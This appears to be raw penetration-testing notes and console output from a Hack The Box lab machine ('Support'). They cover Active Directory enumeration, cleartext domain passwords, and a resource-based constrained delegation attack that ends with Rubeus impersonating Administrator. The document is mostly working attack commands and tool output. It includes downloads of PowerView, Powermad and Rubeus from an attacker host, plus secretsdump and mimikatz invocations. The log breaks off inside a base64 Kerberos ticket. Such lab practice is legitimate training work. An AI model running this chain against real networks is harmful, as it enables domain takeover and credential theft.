@@ -1,0 +1,823 @@
+Use with caution. You are responsible for your actions
+Developers assume no liability and are not responsible for any misuse or damage.
+[INF] Running CONNECT scan with non root privileges
+[INF] Found 6 ports on host 10.10.11.174 (10.10.11.174)
+10.10.11.174:389
+10.10.11.174:135
+10.10.11.174:139
+10.10.11.174:445
+10.10.11.174:88
+10.10.11.174:53
+[INF] Running nmap command: nmap -sCV -Pn -p 53,389,135,139,445,88 10.10.11.174
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-03 03:57 EDT
+Nmap scan report for support.htb (10.10.11.174)
+Host is up (0.12s latency).
+
+PORT    STATE SERVICE       VERSION
+53/tcp  open  domain        Simple DNS Plus
+88/tcp  open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-03 07:57:22Z)
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
+445/tcp open  microsoft-ds?
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   311:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2022-11-03T07:57:46
+|_  start_date: N/A
+|_clock-skew: -4s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 68.94 seconds
+
+kali@kali:~/htb/support.htb/evil-winrm-3.3$ nmap -sCV -Pn -p- support.htb
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-04 04:09 EDT
+Nmap scan report for support.htb (10.10.11.174)
+Host is up (0.059s latency).
+Not shown: 65516 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-04 08:11:56Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49688/tcp open  msrpc         Microsoft Windows RPC
+49702/tcp open  msrpc         Microsoft Windows RPC
+50676/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -4s
+| smb2-time:
+|   date: 2022-11-04T08:12:50
+|_  start_date: N/A
+| smb2-security-mode:
+|   311:
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 266.46 seconds
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+nmap -p 88 -Pn --script krb5-enum-users --script-args krb5-enum-users.realm='support.htb' 10.10.11.174 
+nmap -p 88 -Pn --script=krb5-enum-users --script-args krb5-enum-users.realm="{Domain_Name}",userdb={Big_Userlist} {IP}
+PORT   STATE SERVICE
+88/tcp open  kerberos-sec
+| krb5-enum-users:
+| Discovered Kerberos principals
+|     administrator@support.htb
+|_    guest@support.htb
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+kali@kali:~$ enum4linux -a -u "guest" -p "" support.htb
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Nov  2 11:56:38 2022
+
+ =========================================( Target Information )=========================================
+
+Target ........... support.htb
+RID Range ........ 500-550,1000-1050
+Username ......... 'guest'
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ============================( Enumerating Workgroup/Domain on support.htb )============================
+
+
+[E] Can't find workgroup/domain
+
+
+
+ ================================( Nbtstat Information for support.htb )================================
+
+Looking up status of 10.10.11.174
+No reply from 10.10.11.174
+
+ ====================================( Session Check on support.htb )====================================
+
+
+[+] Server support.htb allows sessions using username 'guest', password ''
+
+
+ =================================( Getting domain SID for support.htb )=================================
+
+Domain Name: SUPPORT
+Domain Sid: S-1-5-21-1677581083-3380853377-188903654
+
+[+] Host is part of a domain (not a workgroup)
+
+
+ ===================================( OS information on support.htb )===================================
+
+
+[E] Can't get OS info with smbclient
+
+
+[+] Got OS info for support.htb from srvinfo:
+        SUPPORT.HTB    Wk Sv PDC Tim NT
+        platform_id     :       500
+        os version      :       10.0
+        server type     :       0x80102b
+
+
+ ========================================( Users on support.htb )========================================
+
+
+[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED
+
+
+
+[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED
+
+
+ ==================================( Share Enumeration on support.htb )==================================
+
+do_connect: Connection to support.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share
+        support-tools   Disk      support staff tools
+        SYSVOL          Disk      Logon server share
+Reconnecting with SMB1 for workgroup listing.
+Unable to connect with SMB1 -- no workgroup available
+
+[+] Attempting to map shares on support.htb
+
+//support.htb/ADMIN$    Mapping: DENIED Listing: N/A Writing: N/A
+//support.htb/C$        Mapping: DENIED Listing: N/A Writing: N/A
+
+[E] Can't understand response:
+
+NT_STATUS_NO_SUCH_FILE listing \*
+//support.htb/IPC$      Mapping: N/A Listing: N/A Writing: N/A
+
+[E] Can't understand response:
+
+do_connect: Connection to dc.support.htb failed (Error NT_STATUS_UNSUCCESSFUL)
+//support.htb/NETLOGON  Mapping: N/A Listing: N/A Writing: N/A
+//support.htb/support-tools     Mapping: OK Listing: OK Writing: N/A
+
+[E] Can't understand response:
+
+do_connect: Connection to dc.support.htb failed (Error NT_STATUS_UNSUCCESSFUL)
+//support.htb/SYSVOL    Mapping: N/A Listing: N/A Writing: N/A
+
+ ============================( Password Policy Information for support.htb )============================
+
+
+[E] Unexpected error from polenum:
+
+
+
+[+] Attaching to support.htb using guest
+
+[+] Trying protocol 139/SMB...
+
+        [!] Protocol failed: Cannot request session (Called Name:SUPPORT.HTB)
+
+[+] Trying protocol 445/SMB...
+
+        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
+
+
+
+[E] Failed to get password policy with rpcclient
+
+
+
+ =======================================( Groups on support.htb )=======================================
+
+
+[+] Getting builtin groups:
+
+
+[+]  Getting builtin group memberships:
+
+
+[+]  Getting local groups:
+
+
+[+]  Getting local group memberships:
+
+
+[+]  Getting domain groups:
+
+
+[+]  Getting domain group memberships:
+
+
+ ===================( Users on support.htb via RID cycling (RIDS: 500-550,1000-1050) )===================
+
+
+[I] Found new SID:
+S-1-5-21-1677581083-3380853377-188903654
+
+[I] Found new SID:
+S-1-5-21-1677581083-3380853377-188903654
+
+[I] Found new SID:
+S-1-5-32
+
+[I] Found new SID:
+S-1-5-32
+
+[I] Found new SID:
+S-1-5-32
+
+[I] Found new SID:
+S-1-5-32
+
+[I] Found new SID:
+S-1-5-32
+
+[I] Found new SID:
+S-1-5-32
+
+[I] Found new SID:
+S-1-5-32
+
+[+] Enumerating users using SID S-1-5-80 and logon username 'guest', password ''
+
+
+[+] Enumerating users using SID S-1-5-32 and logon username 'guest', password ''
+
+
+S-1-5-32-544 BUILTIN\Administrators (Local Group)
+S-1-5-32-545 BUILTIN\Users (Local Group)
+S-1-5-32-546 BUILTIN\Guests (Local Group)
+S-1-5-32-548 BUILTIN\Account Operators (Local Group)
+S-1-5-32-549 BUILTIN\Server Operators (Local Group)
+S-1-5-32-550 BUILTIN\Print Operators (Local Group)
+
+[+] Enumerating users using SID S-1-5-80-3139157870-2983391045-3678747466-658725712 and logon username 'guest', password ''
+
+
+[+] Enumerating users using SID S-1-5-21-2816919640-4237605231-3101097542 and logon username 'guest', password ''
+
+S-1-5-21-2816919640-4237605231-3101097542-500 DC\Administrator (Local User)
+S-1-5-21-2816919640-4237605231-3101097542-501 DC\Guest (Local User)
+S-1-5-21-2816919640-4237605231-3101097542-503 DC\DefaultAccount (Local User)
+S-1-5-21-2816919640-4237605231-3101097542-504 DC\WDAGUtilityAccount (Local User)
+S-1-5-21-2816919640-4237605231-3101097542-513 DC\None (Domain Group)
+
+[+] Enumerating users using SID S-1-5-90 and logon username 'guest', password ''
+
+
+[+] Enumerating users using SID S-1-5-21-1677581083-3380853377-188903654 and logon username 'guest', password ''
+
+S-1-5-21-1677581083-3380853377-188903654-500 SUPPORT\Administrator (Local User)
+S-1-5-21-1677581083-3380853377-188903654-501 SUPPORT\Guest (Local User)
+S-1-5-21-1677581083-3380853377-188903654-502 SUPPORT\krbtgt (Local User)
+S-1-5-21-1677581083-3380853377-188903654-512 SUPPORT\Domain Admins (Domain Group)
+S-1-5-21-1677581083-3380853377-188903654-513 SUPPORT\Domain Users (Domain Group)
+S-1-5-21-1677581083-3380853377-188903654-514 SUPPORT\Domain Guests (Domain Group)
+S-1-5-21-1677581083-3380853377-188903654-515 SUPPORT\Domain Computers (Domain Group)
+S-1-5-21-1677581083-3380853377-188903654-516 SUPPORT\Domain Controllers (Domain Group)
+S-1-5-21-1677581083-3380853377-188903654-517 SUPPORT\Cert Publishers (Local Group)
+S-1-5-21-1677581083-3380853377-188903654-518 SUPPORT\Schema Admins (Domain Group)
+S-1-5-21-1677581083-3380853377-188903654-519 SUPPORT\Enterprise Admins (Domain Group)
+S-1-5-21-1677581083-3380853377-188903654-520 SUPPORT\Group Policy Creator Owners (Domain Group)
+S-1-5-21-1677581083-3380853377-188903654-521 SUPPORT\Read-only Domain Controllers (Domain Group)
+S-1-5-21-1677581083-3380853377-188903654-522 SUPPORT\Cloneable Domain Controllers (Domain Group)
+S-1-5-21-1677581083-3380853377-188903654-525 SUPPORT\Protected Users (Domain Group)
+S-1-5-21-1677581083-3380853377-188903654-526 SUPPORT\Key Admins (Domain Group)
+S-1-5-21-1677581083-3380853377-188903654-527 SUPPORT\Enterprise Key Admins (Domain Group)
+S-1-5-21-1677581083-3380853377-188903654-1000 SUPPORT\DC$ (Local User)
+
+ ================================( Getting printer info for support.htb )================================
+
+do_cmd: Could not initialise spoolss. Error was NT_STATUS_OBJECT_NAME_NOT_FOUND
+
+
+enum4linux complete on Wed Nov  2 12:10:14 2022
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+kali@kali:~$ smbmap -u "guest" -p "" -P 445 -H support.htb
+[+] IP: support.htb:445 Name: unknown
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                NO ACCESS       Logon server share
+        support-tools                                           READ ONLY       support staff tools
+        SYSVOL                                                  NO ACCESS       Logon server share
+		
+------------------------------------------------------------------------------------------------------------------------------------------
+
+D:\support.htb\UserInfo.exe>UserInfo.exe -v find user -first *
+raven.clifton
+anderson.damian
+monroe.david
+cromwell.gerard
+west.laura
+levine.leopoldo
+langley.lucy
+daughtler.mabel
+bardot.mary
+stoll.rachelle
+thomas.raphael
+smith.rosario
+wilson.shelby
+hernandez.stanley
+ford.victoria
+
+D:\support.htb\UserInfo.exe>UserInfo.exe find -last *
+Administrator
+Administrators
+Print Operators
+Backup Operators
+Replicator
+krbtgt
+Domain Controllers
+Schema Admins
+Enterprise Admins
+Domain Admins
+Server Operators
+Account Operators
+Read-only Domain Controllers
+Key Admins
+Enterprise Key Admins
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -at SIMPLE --no-json --no-grep -o /home/kali/htb/support.htb/ldapdump support.htb
+
+rpcclient //support.htb -U support/ldap%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
+rpcclient //support.htb -U support/ldap --pw-nt-hash
+
+
+crackmapexec smb 10.10.11.174 -d support -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -x 'whoami'
+
+smbmap -H support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support
+
+smbclient "\\\\10.10.11.174\\\" -U 'support//ldap' -W 'support.htb' -l '10.10.11.174'
+
+crackmapexec smb 10.10.11.174 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --shares
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+smbmap -H support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support
+[+] IP: support.htb:445 Name: unknown
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share
+        support-tools                                           READ ONLY       support staff tools
+        SYSVOL                                                  READ ONLY       Logon server share
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+smbclient //10.10.11.174/NETLOGON -U 'ldap' -W 'support' -l '10.10.11.174'
+smbclient //10.10.11.174/IPC$ -U 'ldap' -W 'support' -l '10.10.11.174'
+smbclient //10.10.11.174/support-tools -U 'ldap' -W 'support' -l '10.10.11.174'
+smbclient //10.10.11.174/SYSVOL -U 'ldap' -W 'support' -l '10.10.11.174'
+
+evil-winrm -i 10.10.11.174 -u ldap
+
+
+ldapsearch -x -H ldap://10.10.11.174 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=support,DC=support"
+
+
+hydra -l support -P /home/kali/Desktop/rockyou.txt 10.10.11.174 ldap2 -V -f
+
+python3 /usr/share/doc/python3-impacket/examples/addcomputer.py -method LDAPS -dc-ip 10.10.11.174 -computer-pass TestPassword321 -computer-name testComputer support/ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+
+python3 targetedKerberoast.py -d test.local -u john -p password123 --dc-ip 10.10.10.1
+
+python3 /usr/lib/python3/dist-packages/cme/modules/mimikatz.py support/ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz@10.10.11.174
+
+python3 /usr/share/doc/python3-impacket/examples/getST.py -spn support.htb -dc-ip 10.10.11.174 -impersonate support support/ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+
+python3 /usr/lib/python3/dist-packages/impacket/examples/secretsdump.py support/ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz@10.10.11.174
+
+
+ldapsearch -v -x -b "DC=support,DC=htb" -H "ldap://10.10.11.174" "(objectclass=*)" "sAMAccountName" -D "support\\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' | grep sAMAccountName
+
+ldapsearch -v -x -b "CN=support,CN=Users,DC=support,DC=htb" -H "ldap://10.10.11.174" "(cn=support)" "sAMAccountName" -D "support\\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
+
+ldapsearch -v -x -b "CN=support,CN=Users,DC=support,DC=htb" -H "ldap://10.10.11.174" "(objectclass=*)" -D "support\\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
+
+------------------------------------------------------------------------------------------------------------------------------------------
+kali@kali:~/htb/support.htb/evil-winrm-3.3$ ldapsearch -v -x -b "DC=support,DC=htb" -H "ldap://10.10.11.174" "(objectclass=*)" "sAMAccountName" -D "support\\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' | grep sAMAccountName
+ldap_initialize( ldap://10.10.11.174:389/??base )
+filter: (objectclass=*)
+requesting: sAMAccountName
+# requesting: sAMAccountName
+sAMAccountName: Administrator
+sAMAccountName: Guest
+sAMAccountName: Administrators
+sAMAccountName: Users
+sAMAccountName: Guests
+sAMAccountName: Print Operators
+sAMAccountName: Backup Operators
+sAMAccountName: Replicator
+sAMAccountName: Remote Desktop Users
+sAMAccountName: Network Configuration Operators
+sAMAccountName: Performance Monitor Users
+sAMAccountName: Performance Log Users
+sAMAccountName: Distributed COM Users
+sAMAccountName: IIS_IUSRS
+sAMAccountName: Cryptographic Operators
+sAMAccountName: Event Log Readers
+sAMAccountName: Certificate Service DCOM Access
+sAMAccountName: RDS Remote Access Servers
+sAMAccountName: RDS Endpoint Servers
+sAMAccountName: RDS Management Servers
+sAMAccountName: Hyper-V Administrators
+sAMAccountName: Access Control Assistance Operators
+sAMAccountName: Remote Management Users
+sAMAccountName: Storage Replica Administrators
+sAMAccountName: DC$
+sAMAccountName: krbtgt
+sAMAccountName: Domain Computers
+sAMAccountName: Domain Controllers
+sAMAccountName: Schema Admins
+sAMAccountName: Enterprise Admins
+sAMAccountName: Cert Publishers
+sAMAccountName: Domain Admins
+sAMAccountName: Domain Users
+sAMAccountName: Domain Guests
+sAMAccountName: Group Policy Creator Owners
+sAMAccountName: RAS and IAS Servers
+sAMAccountName: Server Operators
+sAMAccountName: Account Operators
+sAMAccountName: Pre-Windows 2000 Compatible Access
+sAMAccountName: Incoming Forest Trust Builders
+sAMAccountName: Windows Authorization Access Group
+sAMAccountName: Terminal Server License Servers
+sAMAccountName: Allowed RODC Password Replication Group
+sAMAccountName: Denied RODC Password Replication Group
+sAMAccountName: Read-only Domain Controllers
+sAMAccountName: Enterprise Read-only Domain Controllers
+sAMAccountName: Cloneable Domain Controllers
+sAMAccountName: Protected Users
+sAMAccountName: Key Admins
+sAMAccountName: Enterprise Key Admins
+sAMAccountName: DnsAdmins
+sAMAccountName: DnsUpdateProxy
+sAMAccountName: Shared Support Accounts
+sAMAccountName: ldap
+sAMAccountName: support
+sAMAccountName: smith.rosario
+sAMAccountName: hernandez.stanley
+sAMAccountName: wilson.shelby
+sAMAccountName: anderson.damian
+sAMAccountName: thomas.raphael
+sAMAccountName: levine.leopoldo
+sAMAccountName: raven.clifton
+sAMAccountName: bardot.mary
+sAMAccountName: cromwell.gerard
+sAMAccountName: monroe.david
+sAMAccountName: west.laura
+sAMAccountName: langley.lucy
+sAMAccountName: daughtler.mabel
+sAMAccountName: stoll.rachelle
+sAMAccountName: ford.victoria
+sAMAccountName: MANAGEMENT$
+------------------------------------------------------------------------------------------------------------------------------------------
+kali@kali:~/htb/support.htb/evil-winrm-3.3$ ldapsearch -v -x -b "CN=support,CN=Users,DC=support,DC=htb" -H "ldap://10.10.11.174" "(objectclass=*)" -D "support\\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
+ldap_initialize( ldap://10.10.11.174:389/??base )
+filter: (objectclass=*)
+requesting: All userApplication attributes
+# extended LDIF
+#
+# LDAPv3
+# base <CN=support,CN=Users,DC=support,DC=htb> with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# support, Users, support.htb
+dn: CN=support,CN=Users,DC=support,DC=htb
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: support
+c: US
+l: Chapel Hill
+st: NC
+postalCode: 27514
+distinguishedName: CN=support,CN=Users,DC=support,DC=htb
+instanceType: 4
+whenCreated: 20220528111200.0Z
+whenChanged: 20220528111201.0Z
+uSNCreated: 12617
+info: Ironside47pleasure40Watchful
+memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
+memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
+uSNChanged: 12630
+company: support
+streetAddress: Skipper Bowles Dr
+name: support
+objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
+userAccountControl: 66048
+badPwdCount: 4
+codePage: 0
+countryCode: 0
+badPasswordTime: 133120214507632181
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132982099209777070
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: support
+sAMAccountType: 805306368
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
+dSCorePropagationData: 20220528111201.0Z
+dSCorePropagationData: 16010101000000.0Z
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+------------------------------------------------------------------------------------------------------------------------------------------
+evil-winrm -i 10.10.11.174 -u support
+Ironside47pleasure40Watchful
+------------------------------------------------------------------------------------------------------------------------------------------
+    Directory: C:\Windows\System32\catroot2
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         7/21/2022   6:00 AM         134978 dberr.txt
+
+
+------------------------------------------------------------------------------------------------------------------------------------------
+$Env:PROCESSOR_ARCHITECTURE
+$Env:PROCESSOR_IDENTIFIER
+
+Get-ADPrincipalGroupMembership support | select name
+
+Invoke-WebRequest -Uri  -OutFile 
+Invoke-WebRequest -Uri http://10.10.16.16:8000/winPEASx64_ofs.exe -OutFile winPEASx64_ofs.exe 
+Invoke-WebRequest -Uri http://10.10.16.16:8000/Powermad.ps1 -OutFile Powermad.ps1
+Invoke-WebRequest -Uri http://10.10.16.16:8000/PowerView.ps1 -OutFile PowerView.ps1
+
+Import-Module .\Powermad.ps1
+Import-Module .\PowerView.ps1
+======================================================Resource-Based Constrained Delegation(>= win 2012)==================================
+target computername: dc
+admin computername: administrator
+fake computer name: FakeComputer01
+fake computer sid: S-1-5-21-1677581083-3380853377-188903654-5103
+fake computer password: FakeComputer01
+
+------------------------------------------------------------------------------------------------------------------------------------------
+[Environment]::OSVersion
+Get-ComputerInfo
+
+get-domainuser |select -first 1
+get-domainobject -identity "DC=support,DC=htb"
+get-domaincontroller
+
+hostname
+dc
+$TargetComputer = "dc.support.htb"
+
+Get-DomainUser support -Properties objectsid | Select -Expand objectsid
+S-1-5-21-1677581083-3380853377-188903654-1105
+$AttackerSID = Get-DomainUser attacker -Properties objectsid | Select -Expand objectsid
+
+Get-ADObject -Identity $TargetComputer -Properties MS-DS-MachineAccountQuota
+ms-ds-machineaccountquota                   : 10
+
+get-domaincomputer dc
+get-domaincomputer dc | select name.msds-allowedtoactonbehalfofotheridentity | fl
+name.msds-allowedtoactonbehalfofotheridentity :
+
+New-MachineAccount -MachineAccount FakeComputer01 -Password $(ConvertTo-SecureString 'FakeComputer01' -AsPlainText -Force)
+[+] Machine account FakeComputer01 added
+
+get-domaincomputer FakeComputer01 | Select -Expand objectsid
+objectsid              : S-1-5-21-1677581083-3380853377-188903654-5103
+
+get-domaincomputer FakeComputer01 | select name.msds-allowedtoactonbehalfofotheridentity | fl
+name.msds-allowedtoactonbehalfofotheridentity :
+
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5103)"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+
+Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+
+
+Get-DomainComputer dc -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
+$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
+$Descriptor.DiscretionaryAcl
+
+BinaryLength       : 36
+AceQualifier       : AccessAllowed
+IsCallback         : False
+OpaqueLength       : 0
+AccessMask         : 983551
+SecurityIdentifier : S-1-5-21-1677581083-3380853377-188903654-5103
+AceType            : AccessAllowed
+AceFlags           : None
+IsInherited        : False
+InheritanceFlags   : None
+PropagationFlags   : None
+AuditFlags         : None
+
+------------------------------------------------------------------------------------------------------------------------------------------
+.\Rubeus.exe hash /password:FakeComputer01 /user:FakeComputer01 /domain:support.htb
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0
+
+
+[*] Action: Calculate Password Hash(es)
+
+[*] Input password             : FakeComputer01
+[*] Input username             : FakeComputer01
+[*] Input domain               : support.htb
+[*] Salt                       : SUPPORT.HTBFakeComputer01
+[*]       rc4_hmac             : A8061F769DDD61A1A517FB6EFC3F1D8A
+[*]       aes128_cts_hmac_sha1 : 89A515F5DB3CC3205F5A0FEB82046303
+[*]       aes256_cts_hmac_sha1 : 577BBA51C1FB5F2175BECC9413AAECC1C463DE1F0ED4AA36CFBA7377297E31AB
+[*]       des_cbc_md5          : 62F7E05B23AE75A2
+
+Rubeus.exe
+Rubeus.exe.config
+Rubeus.pdb
+
+Invoke-WebRequest -Uri http://10.10.16.16:8000/Rubeus.exe -OutFile Rubeus.exe
+Invoke-WebRequest -Uri http://10.10.16.16:8000/Rubeus.exe.config -OutFile Rubeus.exe.config
+Invoke-WebRequest -Uri http://10.10.16.16:8000/Rubeus.pdb -OutFile Rubeus.pdb
+
+
+.\Rubeus.exe s4u /user:FakeComputer01$ /rc4:A8061F769DDD61A1A517FB6EFC3F1D8A /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /ptt
+
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0
+
+[*] Action: S4U
+
+[*] Using rc4_hmac hash: A8061F769DDD61A1A517FB6EFC3F1D8A
+[*] Building AS-REQ (w/ preauth) for: 'support.htb\FakeComputer01$'
+[*] Using domain controller: ::1:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIFojCCBZ6gAwIBBaEDAgEWooIEszCCBK9hggSrMIIEp6ADAgEFoQ0bC1NVUFBPUlQuSFRCoiAwHqAD
+      AgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0YqOCBG0wggRpoAMCARKhAwIBAqKCBFsEggRXZno0jrz1
+      Tr8xuQvULnjznO+hL6yUPoLg6KLuW6PeaZAzruLXVIEB9Qy3wxFy01dqaSLJ+TdKc0+sPFB3E72FwcrW
+      azh7e9nhS7UrUwxxUPPMId6A+teidw2SIvWudsubHg9pdnremDDBCnmZ4HLU/o3jh8GvFBcBJNjMwG6n
+      WgjUl31RBXtqzY/lyiWj9cq64clPpHkv5QSjQNPFgFF3AFOivQSEilUIvwHXx8akRSIuHviL1+aAkzj+
+      pA6+2mFu9qvPuIa4vk6S4n7YGuQN0eDk4ria5FyjYfqVlgN8Hbzqm6MMF5OTD6KBdjifMKci22NhuLEH
+      Wq7Q9wRGTQESVo/7m/rwdk165wa4bpGkM9I9YZPkOKSxgaiG/COVhFHfbRW9zFt46PzJzTNBzRYKwKL1
+      Tijv3yWuaowacKsg1G8G82ESVUCOD5mVMja6Gf2m3MARk5YEkCc0XwgEkRFNwhm76AlhIEelvCOE0y3D
+      uN3m/UcbqKrcIcYhegtR0QuZ2ZM98vOpeHH3CDtW+gP6PtNOfIREVA1G+0Wp9k4ap99olMkcZifk2LQU
+      dfeQ/m55do1Wuw+tI16w3kYm0rMIDD5xTG1WgesXF1hpopO+MedxXZrQPHsDPq+DnhOSCXO8RFV5fsVS
+      +2PRi6/FuGa0Uvlt943B0+8shrQ4UfeEYnl5bhwLgafXUPX69roNxzXY/EJsZ2csZxlyRJ3MyT512JYi
+      ZHBwN6xKRL6lIiEPi+9sJLUQedIrOrlV6NDYBSAtfq8T6fE59VtPz/bDu1Th4g+ahsZiqeNmDMmxM+0X
+      oJc6njKHJrC7hreCJpaG9pisgc2EIN2nr8GhNhYrKWCXnwxd8ePCAmodHbJ32sye0UZLABUi26JvfD6v
+      b7t2WsxUG3vYArKLNX1t1MRjkxt++p9rPvsPS9P3pqZ6ew1FSQAfmU5Q38Oel1V8ak/Tk9yBOOXF/8ew
+      a0r0QOLDPyrRFdjcQcJgvDS6ljbZF1MLvFrSyOIoYTP1WLQj1WLtiReE6ZXwsbtt2cw+S0qSvvanufpi
+      Hw44gqupoiNOM3ZxcihuESbCKWyQbsjvQvkcjjW7TEqLfNs6i6mo6MpI2AF/qedTbOhxItDNlHoNHbtM
+      EL52Fmb5b1+ZJsxtmC8IOhzDohREotmMdDrZwUIOpE/H0TpUGhOA+0w3LhxijxmsIRagyWeTru7DIwyS
+      51GDaa3aQmbX7NqMDXYtU3R/zQ/OrK9N11bn36el/Dw6CdT8KrwEMLjv7fDwWF2dJSxxorjlavjUhGfa
